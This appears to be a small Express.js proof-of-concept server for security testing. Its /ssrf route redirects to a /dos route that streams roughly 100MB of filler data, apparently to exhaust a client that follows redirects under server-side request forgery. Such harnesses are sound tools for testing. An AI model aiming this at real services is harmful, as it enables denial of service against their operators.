const express = require("express");
const app = express();
const PORT = 3000; // Change port if needed

// Route to simulate a large response (potential DoS vector)
app.get("/dos", (req, res) => {
  res.status(200);
  res.setHeader("Content-Type", "text/plain");

  // Option: Stream a large amount of data
  // Here, we're sending 1KB chunks repeatedly until we reach ~100MB total.
  const chunk = "A".repeat(1024); // 1KB chunk
  const iterations = 102400;      // 102400 * 1KB ≈ 100MB total
  let counter = 0;

  function sendChunk() {
    if (counter < iterations) {
      // Write one chunk, then schedule the next chunk immediately.
      res.write(chunk);
      counter++;
      setImmediate(sendChunk);
    } else {
      res.end();
      console.log("Finished streaming large response for DoS testing.");
    }
  }

  sendChunk();
  console.log("Started streaming large response for DoS testing.");
});

// Route to trigger SSRF redirect (for context)
app.get("/ssrf", (req, res) => {
  // Redirect with a 303 status code to the large-response endpoint
  res.status(303).set("Location", `http://localhost:${PORT}/dos`).send();
  console.log("Redirecting to /dos for SSRF/DoS testing...");
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
